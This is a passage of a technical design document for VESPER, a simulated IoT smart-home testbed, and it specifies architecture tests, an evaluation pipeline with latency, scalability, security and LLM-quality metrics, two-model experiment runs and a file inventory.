- Changing the Docker architecture
- Adding new device types
- Adding new attack types (besides rewriting network_attacks.py)
- Real hardware support (ESP32-C3 physical devices)

### 9.3 Success Criteria — Runtime Assertions & Integration Tests

The old success criteria were smoke tests (`python -c "..."` one-liners). Replace with **runtime assertions** that verify architectural invariants, and **integration tests** that verify data flow.

#### 9.3.1 Runtime Assertions (built into VesperEngine)

These run automatically in strict mode at the end of `engine.initialize()`:

```python
# In VesperEngine._verify_invariants():

# A1: Singleton EventBus
assert isinstance(self.event_bus, EventBus), "INV-1: event_bus type mismatch"
assert self.environment._event_bus is self.event_bus, "INV-1: Environment has different EventBus"
if self.hub:
    assert self.hub._event_bus is self.event_bus, "INV-1: Hub has different EventBus"

# A2: Singleton DeviceRegistry
if self.environment._registry:
    assert self.environment._registry is self.registry, "INV-2: Environment._registry diverged"

# A2b: Environment↔Registry consistency
for did in self.environment._devices:
    assert did in self.registry, f"INV-2: device {did} in Environment but not in registry"

# A3: Singleton MatterBridgeClient
if self.matter_bridge and self.hub:
    assert self.hub._matter_bridge is self.matter_bridge, "INV-3: Hub has different MatterBridgeClient"

# A4: Hub mandatory with Matter
if self.matter_bridge:
    assert self.hub is not None, "INV-4: Matter enabled but Hub is None"

# A5: No simulation.py collision — verify the module resolves to a package, not a file
import pathlib
_sim_init = pathlib.Path(__file__).resolve().parent / "simulation" / "__init__.py"
_sim_file = pathlib.Path(__file__).resolve().parent / "simulation.py"
assert _sim_init.exists(), "INV-5: vesper/simulation/__init__.py missing"
assert not _sim_file.exists(), "INV-5: vesper/simulation.py still exists (file/package collision)"
```

#### 9.3.2 Integration Tests (new file: `tests/test_architecture.py`)

```python
"""
tests/test_architecture.py — Architecture invariant integration tests.

These tests verify the redesigned architecture at the integration level.
Run with: pytest tests/test_architecture.py -v
"""

import pytest
from vesper.engine import VesperEngine
from vesper.core.event_bus import EventBus
from vesper.core.registry import DeviceRegistry


class TestSingletonInvariants:
    """INV-1 through INV-3: Singleton shared objects."""

    def test_one_event_bus(self):
        engine = VesperEngine()
        engine.initialize(use_mock_sim=True)
        assert isinstance(engine.event_bus, EventBus)
        assert engine.environment._event_bus is engine.event_bus

    def test_one_registry(self):
        engine = VesperEngine()
        engine.initialize(use_mock_sim=True)
        assert isinstance(engine.registry, DeviceRegistry)
        if engine.environment._registry:
            assert engine.environment._registry is engine.registry

    def test_devices_in_both_stores(self):
        engine = VesperEngine()
        engine.initialize(use_mock_sim=True)
        for did in engine.environment._devices:
            assert did in engine.registry, f"Device {did} missing from registry"


class TestHubRouting:
    """INV-4: All traffic routes through Hub."""

    def test_matter_forces_hub(self):
        engine = VesperEngine()
        engine.initialize(use_mock_sim=True, matter=True, strict=True)
        assert engine.hub is not None, "matter=True must force hub=True in strict mode"

    def test_no_hub_compat_mode(self):
        engine = VesperEngine()
        # In compat mode, matter without hub is allowed (with warning)
        engine.initialize(use_mock_sim=True, matter=True, strict=False)
        # No assertion — just verify no crash


class TestNoCollision:
    """INV-5: No file/package name collision."""

    def test_no_importlib_hack(self):
        import pathlib
        sim_init = pathlib.Path(__file__).resolve().parent.parent / "vesper" / "simulation" / "__init__.py"
        with open(sim_init) as f:
            content = f.read()
        assert "importlib.util" not in content, "simulation/__init__.py still has importlib hack"

    def test_no_simulation_file(self):
        import pathlib
        sim_file = pathlib.Path(__file__).resolve().parent.parent / "vesper" / "simulation.py"
        assert not sim_file.exists(), "vesper/simulation.py still exists (file/package collision)"

    def test_simulation_alias(self):
        from vesper.simulation import Simulation
        from vesper.engine import VesperEngine
        assert Simulation is VesperEngine


class TestEventBusSemantics:
    """Verify EventBus delivery guarantees."""

    def test_synchronous_dispatch(self):
        bus = EventBus()
        received = []
        bus.subscribe("test", lambda e: received.append(e))
        from vesper.core.event_bus import Event
        bus.publish(Event(event_type="test", source_id="t"))
        assert len(received) == 0  # not yet dispatched
        bus.process_events()
        assert len(received) == 1  # dispatched after process_events()

    def test_at_most_once(self):
        bus = EventBus()
        call_count = [0]
        def bad_handler(e):
            call_count[0] += 1
            raise ValueError("handler error")
        bus.subscribe("test", bad_handler)
        from vesper.core.event_bus import Event
        bus.publish(Event(event_type="test", source_id="t"))
        bus.process_events()
        assert call_count[0] == 1  # called once, not retried

    def test_queue_overflow_drops(self):
        bus = EventBus(max_queue_size=5)
        from vesper.core.event_bus import Event
        for i in range(10):
            bus.publish(Event(event_type="test", source_id=str(i)))
        assert bus.stats["events_dropped"] > 0
```

#### 9.3.3 Original Smoke Tests (still valid, run in Phase 10)

These are **supplementary** to the runtime assertions — not replacements:

1. `python -c "from vesper.engine import VesperEngine; VesperEngine()"` works
2. `python -m vesper --demo` works
3. `pytest tests/` passes (includes `test_architecture.py`)
4. `python -c "from vesper.config import Config; c = Config(); print(c.network.wifi.ssid)"` prints "VESPER-IoT-Network"

---

## 10. Evaluation Pipeline

> **Purpose**: This section specifies the complete evaluation methodology for the MobiCom 2026 paper. It defines metrics, experiments, statistical requirements, file creation plan, and paper-ready outputs. Claude Code should implement these in `vesper/evaluation/` when implementing Phase 11 (after the architecture redesign is complete and verified).

### 10.1 Metric Groups

#### Group A — Activity Distribution Realism

Measures how closely VESPER's simulated human activity patterns match real-world ADL (Activities of Daily Living) datasets.

| Metric | Formula / Method | Baseline | Target | Unit |
|--------|-----------------|----------|--------|------|
| A1. Jensen-Shannon Divergence | $JSD(P_{sim} \| P_{real}) = \frac{1}{2} D_{KL}(P \| M) + \frac{1}{2} D_{KL}(Q \| M)$ where $M = \frac{1}{2}(P+Q)$ | Random baseline ≈ 0.69 | < 0.15 | nats |
| A2. Wasserstein Distance | $W_1(P, Q) = \inf_{\gamma \in \Gamma(P,Q)} \mathbb{E}_{(x,y) \sim \gamma}[\|x - y\|]$ | Random ≈ 0.45 | < 0.10 | normalized |
| A3. Transition Matrix Correlation | Pearson correlation between simulated and real activity transition matrices | Random ≈ 0.0 | > 0.70 | r |
| A4. Schedule Entropy | $H(S) = -\sum_{i} p_i \log_2 p_i$ over hourly activity bins | Random ≈ max entropy | Within 15% of real | bits |
| A5. Temporal Autocorrelation | Lag-1 autocorrelation of activity sequences | Random ≈ 0.0 | > 0.50 | r |

**Data sources**: MIT CASAS, ARAS, UCI ADL datasets (downloaded via `evaluation/download_datasets.py`).

**Existing implementation**: `metrics.py` → `compute_kl_divergence()`, `compute_js_divergence()`, `compute_wasserstein_distance()`, `compute_transition_matrix()`, `compute_schedule_entropy()`, `compute_temporal_correlation()`, `ActivityDistributionMetrics`.

#### Group B — Latency & Throughput

End-to-end timing from 3D sensor trigger to Home Assistant entity state change.

| Metric | Measurement point | Baseline | Target | Unit |
|--------|------------------|----------|--------|------|
| B1. Sensor-to-HA Latency (P50) | Timestamp at `SensorBridge.on_motion()` → timestamp at HA `state_changed` WebSocket event | — | < 100 ms (sim mode), < 500 ms (Docker WiFi) | ms |
| B2. Sensor-to-HA Latency (P99) | Same, 99th percentile | — | < 500 ms (sim), < 2000 ms (Docker WiFi) | ms |
| B3. Hub Throughput | Events/sec through VirtualHub without queue overflow | — | ≥ 100 events/sec | events/s |
| B4. WiFi Round-Trip | `WiFiEmulator.route_to_bridge()` call → response received | — | < 50 ms (sim), < 200 ms (Docker) | ms |
| B5. EventBus Drain Time | `process_events()` wall-clock time for 1000 queued events | — | < 10 ms | ms |
| B6. Matter Bridge REST Latency | HTTP PUT → HTTP 200 response from bridge.mjs | — | < 30 ms (Docker network) | ms |

**Existing implementation**: `latency_profiler.py` → `LatencyProfiler`, `LatencyProbe`; `metrics.py` → `LatencyMetrics`.

#### Group C — Scalability

System behavior as device count increases from 1 to 50+.

| Metric | X-axis | Expected behavior | Failure threshold |
|--------|--------|-------------------|-------------------|
| C1. Device Registration Time | # devices (1, 5, 10, 20, 50) | Sub-linear (< O(n)) | > 1s for 50 devices |
| C2. Tick Time vs Devices | # devices | Linear acceptable | > 100ms/tick at 20 devices |
| C3. Memory per Device | # devices | ~constant per device | > 10 MB/device |
| C4. EventBus Queue Depth | # devices × event rate | Bounded by max_queue_size | > 0 events_dropped at 20 devices |
| C5. Hub Traffic Log Size | # devices × duration | Linear in events | > 1 GB/hour at 20 devices |

**Existing implementation**: `scalability_bench.py` → `ScalabilityBenchmark`; `metrics.py` → `ScalabilityMetrics`.

#### Group D — Security Evaluation

Attack success rates, CVSS scoring, and disruption metrics.

| Metric | Method | Expected range |
|--------|--------|---------------|
| D1. Attack Success Rate | `successful_attacks / total_attacks` per attack category | WiFi: 60-90%, REST injection: 90-100% (no auth), firmware: 20-50% |
| D2. CVSSv3.1 Base Score | Calculated per vulnerability using `CVSSv31` class | Range 3.0–9.8 depending on attack |
| D3. Disruption Duration | Time from attack start to device offline → time to recovery | WiFi deauth: 5-30s, REST injection: until detected |
| D4. Detection Latency | Time from attack execution to anomaly detected (if detector exists) | Baseline: ∞ (no detector), future: < 5s |
| D5. Automation Disruption | % of TAP rules that evaluate incorrectly during attack | 0-100% per attack type |
| D6. Recovery Rate | % of devices that return to correct state after attack stops | Target: 100% for WiFi, uncertain for state injection |

**Existing implementation**: `security_eval.py` → `CVSSv31`, `ScoredAttack`, `SecurityEvaluator` (1648 lines, very complete).

#### Group E — Architecture Correctness (NEW)

These metrics validate the redesigned architecture itself. They have binary pass/fail outcomes.

| Metric | Test | Pass condition |
|--------|------|---------------|
| E1. EventBus Singleton | Count `EventBus()` constructor calls at runtime | Exactly 1 (in VesperEngine) |
| E2. DeviceRegistry Singleton | Count `DeviceRegistry()` constructor calls | Exactly 1 |
| E3. MatterBridgeClient Singleton | Count `MatterBridgeClient()` constructor calls | Exactly 1 (when Matter enabled) |
| E4. Hub Routing Coverage | Log all device state updates; check % routed through Hub | 100% in strict mode |
| E5. Device Store Consistency | Compare `Environment._devices.keys()` vs `DeviceRegistry._devices.keys()` at end of run | 100% overlap (every env device in registry) |
| E6. Event Delivery Rate | `events_processed / events_published` from EventBus stats | > 99% (< 1% dropped) |
| E7. No Import Errors | `python -c "import vesper; vesper.VesperEngine()"` | Exit code 0 |
| E8. No Dead Code Imports | `grep -r "from vesper.protocol" vesper/` | 0 matches |

**Implementation**: New file `vesper/evaluation/architecture_correctness.py` — runs E1-E8 and returns pass/fail per metric.

#### Group F — LLM Agent Quality

Measures the quality of LLM-generated activity schedules and task plans.

| Metric | Method | Target |
|--------|--------|--------|
| F1. Task Completion Rate | `completed_tasks / generated_tasks` | > 80% |
| F2. Activity Diversity | Unique activity types generated / total possible | > 60% |
| F3. Temporal Coherence | % of generated schedules that respect time-of-day constraints (e.g., no cooking at 3 AM) | > 90% |
| F4. LLM vs No-LLM JSD | JSD of activity distribution with vs without LLM guidance | LLM JSD < No-LLM JSD |
| F5. LLM Latency | Time per LLM inference call | < 2s (local LM Studio) |

**Existing implementation**: `llm_ablation.py` → `LLMAblation`; `metrics.py` → `LLMAblationResult`.

### 10.2 Experiment Groups

Each experiment group tests one hypothesis. All experiments use the same random seed (42) for reproducibility.

#### Experiment 1: Activity Realism (Metrics A1-A5)

| Parameter | Value |
|-----------|-------|
| Duration | 24 simulated hours × 5 seeds |
| Devices | 8 (standard household set) |
| Agent | LLM-guided humanoid |
| Comparison | MIT CASAS aruba dataset |
| Output | Table 1 (paper), Figure 2 (distribution plots) |

**Protocol**:
1. Run 24h simulation with LLM agent, record activity log
2. Bin activities into 24 hourly slots
3. Compute A1-A5 against CASAS ground truth
4. Repeat with 5 different seeds
5. Report mean ± 95% CI

#### Experiment 2: LLM Ablation (Metrics A1-A5, F1-F5)

| Parameter | Value |
|-----------|-------|
| Conditions | (a) LLM-guided, (b) rule-based, (c) random walk |
| Duration | 24h × 5 seeds per condition |
| Output | Table 2 (paper), Figure 3 (ablation bar chart) |

**Protocol**:
1. Run same scenario under all 3 conditions
2. Compute A1-A5 for each condition
3. Paired Wilcoxon test: LLM vs rule-based, LLM vs random
4. Report effect sizes (Cohen's d)

#### Experiment 3: End-to-End Latency (Metrics B1-B6)

| Parameter | Value |
|-----------|-------|
| Modes | (a) sim-only, (b) Docker containers, (c) Docker + WiFi emulation |
| Devices | 8 |
| Events | 1000 sensor triggers per mode |
| Output | Table 3 (paper), Figure 4 (CDF plots) |

**Protocol**:
1. Instrument `SensorBridge`, `WiFiEmulator`, `VirtualHub`, `MatterBridgeClient` with timestamp probes
2. Trigger 1000 motion events at 10 events/sec
3. Record per-event latency breakdown: sensor→EventBus, EventBus→Hub, Hub→WiFi, WiFi→Bridge, Bridge→HA
4. Compute P50, P95, P99 for each segment and end-to-end
5. Report CDF and breakdown stacked bar chart

#### Experiment 4: Scalability (Metrics C1-C5)

| Parameter | Value |
|-----------|-------|
| Device counts | 1, 2, 5, 10, 20, 50 |
| Duration | 60s per device count |
| Output | Table 4 (paper), Figure 5 (scaling line plots) |

**Protocol**:
1. For each device count N:
   a. Initialize VesperEngine with N devices
   b. Run 60s simulation
   c. Record: init time, avg tick time, peak memory, EventBus stats, Hub traffic log size
2. Plot all C1-C5 metrics vs N
3. Fit regression line; report $R^2$ and slope

#### Experiment 5: Security Evaluation (Metrics D1-D6)

| Parameter | Value |
|-----------|-------|
| Attack categories | WiFi (4 attacks), REST API (3 attacks), TCP (3 attacks), Firmware (4 attacks), Phantom delay (3 attacks) |
| Repetitions | 10 per attack |
| Duration | 30s per attack |
| Output | Table 5 (paper), Figure 6 (attack success heatmap), Table 6 (CVSS scores) |

**Protocol**:
1. For each attack:
   a. Start normal simulation (8 devices, LLM agent)
   b. At t=10s, execute attack
   c. At t=25s, stop attack
   d. Record: success/fail, disruption start/end, affected devices, automation disruptions
2. Compute D1-D6
3. Generate CVSS score per vulnerability
4. Report attack success heatmap and CVSS table

#### Experiment 6: Architecture Correctness (Metrics E1-E8)

| Parameter | Value |
|-----------|-------|
| Modes | strict=True, strict=False |
| Duration | Single run per mode |
| Output | Table 7 (paper, appendix) |

**Protocol**:
1. Run VesperEngine with strict=True, matter=True, hub=True, wifi=True
2. Check all E1-E8 metrics
3. Report pass/fail table

#### Experiment 7: Comparative WiFi Fidelity (NEW for MobiCom)

| Parameter | Value |
|-----------|-------|
| Conditions | (a) sim mode (simulated latency), (b) Docker WiFi (mac80211_hwsim), (c) real WiFi (if available) |
| Metrics | B1-B4, D1-D3 (same attacks in each condition) |
| Output | Table 8 (paper), Figure 7 (fidelity comparison) |

**Protocol**:
1. Run identical workload in all 3 WiFi conditions
2. Compare latency distributions and attack success rates
3. Report: Does sim mode faithfully approximate Docker WiFi?
4. Statistical test: Two-sample KS test on latency distributions

### 10.3 Statistical Reporting Requirements

All experimental results in the paper MUST meet these statistical standards:

| Requirement | Specification |
|-------------|---------------|
| **Confidence intervals** | 95% CI on all reported means, computed via bootstrap (10,000 resamples) or t-distribution (when n ≥ 30) |
| **Effect sizes** | Cohen's d for all pairwise comparisons; interpret as small (0.2), medium (0.5), large (0.8) |
| **Significance tests** | Wilcoxon signed-rank test for paired comparisons (non-parametric, no normality assumption); Bonferroni correction for multiple comparisons |
| **Multiple comparisons** | Family-wise error rate controlled at α = 0.05 via Bonferroni correction. For k comparisons, threshold = 0.05/k |
| **Reproducibility** | All experiments seeded with `random_seed: 42` (from config). Full seed list for multi-seed experiments: [42, 123, 456, 789, 1024] |
| **Decimal precision** | Latency: 1 decimal (ms). JSD/Wasserstein: 3 decimals. Percentages: 1 decimal. CVSS: 1 decimal. |
| **Sample sizes** | Report N for every metric. Minimum N = 5 for per-seed metrics, N = 1000 for per-event metrics |

**Existing statistical functions** (in `metrics.py`): `cohens_d()`, `confidence_interval()`, `wilcoxon_test()`, `bonferroni_correction()`.

### 10.4 File Creation Plan

New and modified files needed for the evaluation pipeline:

| File | Status | Contents |
|------|--------|----------|
| `vesper/evaluation/architecture_correctness.py` | **CREATE** | `ArchitectureCorrectnessEvaluator` — checks E1-E8, returns pass/fail dict |
| `vesper/evaluation/pipeline.py` | **CREATE** | `EvaluationPipeline` — orchestrates all 7 experiment groups, calls metric functions, generates reports |
| `vesper/evaluation/experiment_configs.py` | **CREATE** | Pydantic models for each experiment's parameters (device counts, durations, seeds, attack lists) |
| `vesper/evaluation/paper_tables.py` | **CREATE** | Functions to generate LaTeX tables from metric results (Tables 1-8) |
| `vesper/evaluation/paper_figures.py` | **CREATE** | Functions to generate matplotlib/seaborn figures (Figures 2-7) |
| `vesper/evaluation/metrics.py` | **MODIFY** | Add `architecture_correctness_metrics()`, `wifi_fidelity_metrics()` |
| `vesper/evaluation/experiment_runner.py` | **MODIFY** | Add experiment configs for Experiments 1-7, integrate with `EvaluationPipeline` |
| `vesper/evaluation/report_generator.py` | **MODIFY** | Add LaTeX table/figure export, full paper-results directory output |
| `scripts/run_full_evaluation.py` | **MODIFY** | Wire to `EvaluationPipeline.run_all()` |

### 10.5 Paper-Ready Outputs

The evaluation pipeline MUST produce these artifacts in `results/paper/`:

```
results/paper/
├── tables/
│   ├── table1_activity_realism.tex          # Exp 1: A1-A5 mean ± CI
│   ├── table2_llm_ablation.tex              # Exp 2: A1-A5 per condition + p-values
│   ├── table3_latency_breakdown.tex         # Exp 3: B1-B6 per mode
│   ├── table4_scalability.tex               # Exp 4: C1-C5 per device count
│   ├── table5_attack_success.tex            # Exp 5: D1-D3 per attack category
│   ├── table6_cvss_scores.tex               # Exp 5: CVSS per vulnerability
│   ├── table7_architecture_correctness.tex  # Exp 6: E1-E8 pass/fail
│   └── table8_wifi_fidelity.tex             # Exp 7: sim vs Docker vs real
├── figures/
│   ├── fig2_activity_distribution.pdf       # Exp 1: simulated vs real histograms
│   ├── fig3_llm_ablation.pdf                # Exp 2: bar chart with error bars
│   ├── fig4_latency_cdf.pdf                 # Exp 3: CDF curves per mode
│   ├── fig5_scalability.pdf                 # Exp 4: line plots with regression
│   ├── fig6_attack_heatmap.pdf              # Exp 5: attack success rate heatmap
│   └── fig7_wifi_fidelity.pdf               # Exp 7: latency distributions overlay
├── raw/
│   ├── exp1_activity_logs.json              # Raw activity sequences
│   ├── exp2_ablation_results.json           # Per-condition per-seed metrics
│   ├── exp3_latency_probes.json             # Per-event timestamp breakdown
│   ├── exp4_scalability_data.json           # Per-N metrics
│   ├── exp5_security_results.json           # Per-attack results + evidence
│   ├── exp6_architecture_check.json         # E1-E8 results
│   └── exp7_wifi_fidelity.json              # Per-mode latency + attack data
└── summary.json                             # All metrics aggregated, machine-readable
```

**LaTeX integration**: Each `.tex` table file uses `\begin{tabular}` and can be included in the paper via `\input{tables/table1_activity_realism.tex}`. Each `.pdf` figure can be included via `\includegraphics`.

**Single command to generate everything**:

```bash
python scripts/run_full_evaluation.py --output results/paper/ --seeds 42,123,456,789,1024
```

### 10.6 Implementation Order for Evaluation

```
Phase 11: Evaluation pipeline (after architecture redesign verified)
  11a. Create vesper/evaluation/experiment_configs.py (Pydantic models)
  11b. Create vesper/evaluation/architecture_correctness.py (E1-E8)
  11c. Create vesper/evaluation/paper_tables.py (LaTeX generators)
  11d. Create vesper/evaluation/paper_figures.py (matplotlib/seaborn)
  11e. Create vesper/evaluation/pipeline.py (orchestrator)
  11f. Modify experiment_runner.py (add Exp 1-7 configs)
  11g. Modify report_generator.py (add paper output)
  11h. Modify scripts/run_full_evaluation.py (wire to pipeline)
  11i. Run full evaluation: python scripts/run_full_evaluation.py
  11j. Verify: all files in results/paper/ exist, LaTeX compiles
```

### 10.7 Final-Data LLM Model Selection (Multi-Model Evaluation)

> **Updated**: Final data collection uses **two LLM models** to enable cross-family comparison in the paper. Both models are run through the full pipeline (all 7 experiments) so that every metric is reported **per model**.

#### Chosen Models

| Model ID | Family | Parameters | Provider | Rationale |
|----------|--------|-----------|----------|-----------|
| `qwen2.5-7b-instruct` | Qwen 2.5 | 7 B | Alibaba | State-of-the-art instruction-tuned; strong on structured output / JSON plans |
| `meta-llama-3.1-8b-instruct` | LLaMA 3.1 | 8 B | Meta | Industry-standard open-weight baseline; widely reproduced in IoT/NLP literature |

**Selection criteria**:

1. **Hardware feasibility** — Both ≤ 8 B parameters, fit comfortably on Apple M2 Pro with 16 GB unified memory via LM Studio. They can be loaded simultaneously.
2. **Cross-family diversity** — One model from Alibaba (Qwen) and one from Meta (LLaMA) prevents single-vendor bias and shows VESPER is model-agnostic.
3. **Instruction-tuning** — Both are `-instruct` variants optimised for tool-use and task planning, which is the primary LLM role in VESPER (generating daily activity schedules, TAP rules, and task sequences).

#### Multi-Model Evaluation Pipeline

The evaluation script (`scripts/run_autonomous_eval.py`) supports multi-model runs:

```
┌─────────────────────────────────────────────────────────┐
│  run_autonomous_eval.py --models final                  │
│                                                         │
│  for model in [qwen2.5-7b-instruct,                    │
│                meta-llama-3.1-8b-instruct]:             │
│      set LLM endpoint → model                          │
│      reset random seed                                  │
│      for scene in scenes:                               │
│          run _run_scene_evaluation(scene, model)        │
│          stamp model metadata on SceneEvalResult        │
│      write results → results/{date}/model_{name}/       │
│                                                         │
│  write_cross_model_report()                             │
│  → cross_model_comparison.csv                           │
│  → cross_model_summary.txt                              │
│  → cross_model_aggregate.json                           │
└─────────────────────────────────────────────────────────┘
```

**CLI usage**:

The `--models` flag composes with all existing flags (`--num-scenes`, `--num-days`, `--with-dashboard`, `--with-smartthings`, `--time-scale`, etc.):

```bash
# ── Full paper data: both models, SmartThings firmware, dashboard, 1 scene quick-test ──
python scripts/run_autonomous_eval.py \
  --models final \
  --num-scenes 1 --num-days 3 \
  --with-dashboard --dashboard-port 8080 \
  --time-scale 60 \
  --with-smartthings

# ── Full paper data: both models, all 168 scenes, headless, with attacks ──
python scripts/run_autonomous_eval.py \
  --models final \
  --num-scenes 168 --num-days 1 \
  --headless --no-pause \
  --with-smartthings --with-attacks \
  --time-scale 60 --seed 42

# ── Single model quick run (1 scene, dashboard, no attacks) ──
python scripts/run_autonomous_eval.py \
  --models qwen2.5-7b-instruct \
  --num-scenes 1 --num-days 3 \
  --with-dashboard --dashboard-port 8080 \
  --time-scale 60 --with-smartthings

# ── Legacy single-model via --model (original flag, still works) ──
python scripts/run_autonomous_eval.py \
  --model meta-llama-3.1-8b-instruct \
  --num-scenes 1 --num-days 1 \
  --with-smartthings --time-scale 60

# ── No model flag (uses LM Studio's default loaded model) ──
python scripts/run_autonomous_eval.py \
  --num-scenes 1 --num-days 3 \
  --with-dashboard --dashboard-port 8080 \
  --time-scale 60 --with-smartthings

# ── Custom endpoint + skip model check ──
python scripts/run_autonomous_eval.py \
  --models final \
  --model-endpoint http://192.168.1.10:1234/v1/chat/completions \
  --skip-model-check \
  --num-scenes 5 --num-days 1 \
  --headless --no-pause --with-smartthings
```

**All CLI flags reference**:

| Flag | Default | Description |
|------|---------|-------------|
| `--models` | None | Multi-model run. Use `final` for both paper models, or list IDs |
| `--model` | None | Single model override (legacy, still works) |
| `--model-endpoint` | localhost:1234 | LM Studio API URL |
| `--skip-model-check` | false | Skip `/v1/models` availability check |
| `--num-scenes` | 168 | Number of HSSD scenes |
| `--num-days` | 1 | Simulated days per scene |
| `--time-scale` | 60 | Time acceleration (60 = 1 real sec → 1 sim min) |
| `--seed` | 42 | Random seed |
| `--with-smartthings` | false | Enable SmartThings Docker firmware |
| `--with-attacks` | false | Enable all attack suites |
| `--with-phantom-delay` | false | Enable phantom-delay attacks |
| `--with-wifi` | false | Enable Mininet-WiFi + ESP32 QEMU bridge |
| `--with-dashboard` | true | Enable real-time web dashboard |
| `--dashboard-port` | 8080 | Dashboard port |
| `--headless` | false | No Pygame display window |
| `--no-pause` | false | Fully unattended (skip prompts between scenes) |
| `--nav-timeout-steps` | 2000 | Max nav steps before giving up |
| `--allow-fallback-tasks` | false | Allow hardcoded tasks when LLM fails |

**Output directory structure** (multi-model run):

```
results/20260310_143000/
├── model_qwen2.5-7b-instruct/
│   ├── eval_results.csv
│   ├── eval_results.json
│   ├── eval_summary.txt
│   ├── nav_results.csv
│   └── per_scene/
│       └── ...
├── model_meta-llama-3.1-8b-instruct/
│   ├── eval_results.csv
│   ├── eval_results.json
│   ├── eval_summary.txt
│   ├── nav_results.csv
│   └── per_scene/
│       └── ...
├── cross_model_comparison.csv
├── cross_model_summary.txt
└── cross_model_aggregate.json
```

**Safeguards**:

- Before starting a multi-model run, the script queries LM Studio's `/v1/models` endpoint to verify all required models are loaded. If any model is missing, the run aborts with an actionable error message.
- Each model run resets the random seed to ensure identical initial conditions for fair comparison.
- Model metadata (name, family, params, provider, timestamps) is stamped on every `SceneEvalResult` and written to every output file.

#### Cross-Model Comparison Metrics

The `write_cross_model_report()` function computes these per-model aggregates and reports them side-by-side:

| Category | Metrics |
|----------|---------|
| Navigation | Success rate, SPL, distance efficiency, collisions/trial |
| Security | WiFi attack %, REST inject %, phantom delay %, firmware exploit %, overall score |
| Latency | TAP trigger-to-action mean/P95 (ms) |
| Coverage | Room coverage %, unique rooms visited |
| Architecture | E2E pipeline completeness |
| Devices | Active device count, device interaction events |

---

## Appendix A: Full File Inventory (Current)

```
vesper/
├── __init__.py              (26 lines)    — package root
├── __main__.py              (284 lines)   — CLI entry point
├── config.py                (166 lines)   — Pydantic config      ← MODIFY
├── engine.py                (NEW ~250)    — VesperEngine          ← CREATE
├── platform.py              (230 lines)   — VesperPlatform        ← MODIFY
├── simulation.py            (223 lines)   — old Simulation        ← DELETE
├── agents/
│   ├── __init__.py
│   ├── base.py              — Agent ABC
│   ├── controller.py        — AgentController
│   ├── llm_client.py        — LLMClient (HTTP to LM Studio)
│   ├── llm_controller.py    — LLM-based agent controller
│   └── smart_agent.py       — SmartAgent implementation
├── attacks/
│   ├── __init__.py
│   ├── firmware_attacks.py  (1056 lines)  — ESP32 QEMU attacks
│   ├── network_attacks.py   (1052 lines)  — ← REWRITE (fake protocol)
│   ├── phantom_delay_attack.py (1684 lines) — TCP proxy delay
│   └── wifi_attacks.py      — Mininet-WiFi layer attacks
├── automation/
│   ├── __init__.py
│   └── tap_engine.py        (1935 lines)  — TAP rule engine
├── core/
│   ├── __init__.py                        ← MODIFY
│   ├── environment.py       (262 lines)   ← MODIFY
│   ├── event_bus.py         (323 lines)   — KEEP
│   └── registry.py          (NEW ~200)    ← CREATE
├── dashboard/
│   ├── __init__.py
│   └── app.py               (726 lines)
├── devices/
│   ├── __init__.py
│   ├── base.py              — IoTDevice ABC
│   ├── contact_sensor.py
│   ├── light_sensor.py
│   ├── manager.py           — DeviceManager
│   ├── motion_sensor.py
│   ├── scene_configs.py
│   ├── scene_device_placer.py
│   ├── security_camera.py
│   └── smart_door.py
├── evaluation/
│   ├── __init__.py
│   ├── activity_comparison.py (813 lines)
│   ├── download_datasets.py
│   ├── experiment_runner.py
│   ├── instrumentation.py
│   ├── latency_profiler.py
│   ├── llm_ablation.py
│   ├── metrics.py
│   ├── report_generator.py
│   ├── scalability_bench.py
│   └── security_eval.py    (1648 lines)
├── firmware/
│   ├── __init__.py
│   ├── esp32_runner.py
│   └── sensor_templates.py  (808 lines)
├── habitat/
│   ├── __init__.py
│   ├── device_placement.py
│   ├── embodiment.py
│   ├── hud.py
│   ├── humanoid.py
│   ├── integration.py
│   ├── iot_bridge.py        (721 lines)
│   ├── iot_config_menu.py   (645 lines)
│   ├── iot_overlay.py
│   ├── scene.py
│   ├── sensor_bridge.py
│   ├── sensors/
│   │   ├── __init__.py
│   │   ├── camera.py
│   │   ├── motion_sensor.py
│   │   └── visualizer.py
│   ├── simulator.py
│   ├── smart_home.py
│   ├── task_manager.py
│   ├── vesper_integration.py (822 lines)  ← SLIM DOWN
│   └── wifi_firmware_bridge.py            ← MODIFY
├── hub/
│   ├── __init__.py
│   ├── base.py              (268 lines)   ← MODIFY (rename TrafficRecord)
│   ├── manager.py           (188 lines)   ← MODIFY
│   ├── physical_hub.py
│   └── virtual_hub.py       (662 lines)   ← MODIFY
├── integrations/
│   ├── __init__.py
│   ├── device_registry.py   (1105 lines)
│   ├── docker_device_manager.py (894 lines)
│   ├── schema_connector.py  (1438 lines)
│   ├── smartthings.py
│   └── sync_bridge.py       (911 lines)
├── matter/
│   ├── __init__.py
│   ├── adapter.py
│   ├── bridge_client.py     (273 lines)   — KEEP
│   ├── client.py
│   ├── const.py
│   └── device.py
├── network/
│   ├── __init__.py                        ← MODIFY
│   ├── broker.py                          ← DELETE
│   ├── home_network.py      (990 lines)   — keep (may be used)
│   ├── router.py                          ← DELETE
│   ├── transport.py                       ← DELETE
│   └── wifi_emulator.py     (774 lines)   ← MODIFY
├── protocol/                              ← DELETE entire directory
│   ├── __init__.py
│   ├── codec.py
│   ├── handler.py
│   └── messages.py
├── simulation/
│   ├── __init__.py          (102 lines)   ← MODIFY (remove importlib hack)
│   ├── autonomous_simulation.py
│   ├── event_stream.py
│   ├── task_database.py
│   ├── task_generator.py
│   ├── task_system.py
│   └── time_manager.py
└── utils/
    ├── __init__.py
    └── dataset.py
```

## Appendix B: Open-Source Tools Used

| Tool | Version | Purpose | Where used |
|------|---------|---------|------------|
| **Mininet-WiFi** | 2.6+ | 802.11 network emulation | docker/router/, WiFiEmulator |
| **mac80211_hwsim** | kernel module | Virtual WiFi radios | Dockerfile.router |
| **hostapd** | 2.10+ | WPA2-PSK authentication | vesper_topology.py |
| **wmediumd** | latest | Signal propagation model | vesper_topology.py |
| **Open vSwitch** | 3.x | Virtual switch for AP | vesper_topology.py |
| **dnsmasq** | 2.89+ | DHCP + DNS for stations | vesper_topology.py |
| **iptables** | 1.8+ | Firewall, NAT, AP isolation | vesper_topology.py |
| **tshark** | 4.x | Packet capture → pcap | WiFiEmulator, pcap scripts |
| **Scapy** | 2.5+ | Craft WiFi attack frames | wifi_attacks.py |
| **socat** | 1.7+ | TCP relay station↔bridge | vesper_topology.py |
| **matter.js** | 0.16+ | Matter device endpoints | docker/matter-bridge/ |
| **python-matter-server** | stable | Matter controller fabric | docker-compose |
| **Home Assistant** | stable | Device management UI | docker-compose |
